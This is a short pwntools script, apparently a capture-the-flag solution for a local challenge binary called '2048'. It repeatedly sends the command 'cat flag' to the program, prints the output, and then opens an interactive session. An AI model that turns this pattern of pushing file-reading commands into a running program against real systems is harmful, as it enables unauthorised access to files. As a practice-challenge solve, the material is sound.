#!/usr/bin/env python

from pwn import *

p = process('./2048')
i = 101

while i > 0:
    p.sendline('cat flag')
    game = p.recv()
    print(game)
    i = i-1
p.sendline('w')
p.interactive()
